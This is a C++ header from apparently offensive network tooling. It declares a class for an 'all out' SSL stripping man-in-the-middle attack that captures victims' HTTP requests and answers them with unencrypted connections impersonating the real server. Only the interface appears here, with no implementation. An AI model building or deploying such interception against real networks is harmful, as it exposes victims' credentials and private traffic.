#pragma once

#include "IpAddress.h"
#include "PcapLiveDevice.h"
#include "ssl_stripping/public.h"
#include "ssl_stripping/ssl_stripping_strategy.h"
#include <mutex>
#include <queue>

namespace ATK::SSL {
/**
 * All out ssl stripping strategy, will capture every http get request packet
 * except the attacker's and send back an unencrypted connection imitating a
 * connection to the server the victim was trying to connect to.
 */
class AllOutSslStrippingStrategy : public ATK::SSL::SslStrippingStrategy {
  public:
    class Builder {
      public:
        explicit Builder(pcpp::PcapLiveDevice *device) : device_(device) {}
        std::unique_ptr<AllOutSslStrippingStrategy> build() {
            return std::unique_ptr<AllOutSslStrippingStrategy>(
                new AllOutSslStrippingStrategy(this->device_, this->attackerIp_,
                                               this->mitmStrategy_));
        }
        /**
         * Adds an attacker IP
         */
        Builder &addAttackerIp(pcpp::IPv4Address attackerIp) {
            attackerIp_ = attackerIp;
            return *this;
        }
        Builder &setMitmStrategy(ATK::SSL::MitmStrategy mitmStrategy) {
            mitmStrategy_ = mitmStrategy;
            return *this;
        }

      private:
        pcpp::PcapLiveDevice *device_;
        pcpp::IPv4Address attackerIp_;
        ATK::SSL::MitmStrategy mitmStrategy_{};
    };

    /**
     * Executes SSL all out stripping attack.
     *
     * Will reply to every incoming HTTP request, of any domain.
     */
    void execute() override;

  private:
    
    // Function to get global variables safely
    struct HttpMessageData {
        std::queue<std::string> httpMessages;
        std::mutex httpMessagesMutex;
        std::condition_variable httpMessagesCV;
    };

    static HttpMessageData &getHttpMessageData() {
        static HttpMessageData data;
        return data;
    }
    
    explicit AllOutSslStrippingStrategy(pcpp::PcapLiveDevice *device,
                                        pcpp::IPv4Address attackerIp,
                                        ATK::SSL::MitmStrategy mitmStrategy)
        : device_(device), attackerIp_(attackerIp),
          mitmStrategy_(mitmStrategy) {
        if (device == nullptr) {
            throw std::invalid_argument("Not a valid interface");
        }
    }

    static void onPacketArrives(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                         void *cookie);

    static std::optional<std::string> connectWithServer(const std::string &domain);
    static void runHttpDummyServer();

    pcpp::PcapLiveDevice *device_;
    pcpp::IPv4Address attackerIp_;
    ATK::SSL::MitmStrategy mitmStrategy_;
};
} // namespace ATK::SSL
